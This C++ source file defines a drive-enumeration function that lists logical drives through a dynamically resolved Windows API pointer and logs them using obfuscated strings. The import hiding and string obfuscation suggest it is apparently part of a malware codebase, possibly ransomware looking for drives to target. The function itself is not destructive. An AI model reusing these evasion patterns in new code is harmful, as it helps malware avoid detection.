#include "filesystem.h"
#include "../api/getapi.h"
#include "../memory.h"
#include "../logs/logs.h"

INT 
filesystem::EnumirateDrives(__in PDRIVE_LIST DriveList)
{
	INT Length = 0;
	INT DrivesCount = 0;
	DWORD DriveType = 0;
	TAILQ_INIT(DriveList);

	SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(0, NULL);
	if (!BufferLength) {
		return 0;
	}

	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + 1) * sizeof(WCHAR));
	if (!Buffer) {
		return 0;
	}

	pGetLogicalDriveStringsW(BufferLength, Buffer);
	
	LPWSTR tempBuffer = Buffer;

	while (Length = (INT)plstrlenW(tempBuffer)) {

		PDRIVE_INFO DriveInfo = new DRIVE_INFO;
		if (!DriveInfo) {

			free(Buffer);
			return 0;

		}

		DriveInfo->RootPath = tempBuffer;
		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);

		DrivesCount++;
		tempBuffer += Length + 1;

	}

	logs::Write(OBFW(L"Found %d drives: "), DrivesCount);

	PDRIVE_INFO DriveInfo = NULL;
	TAILQ_FOREACH(DriveInfo, DriveList, Entries) {
		logs::Write(OBFW(L"%s"), DriveInfo->RootPath.c_str());
	}

	free(Buffer);
	return DrivesCount;
}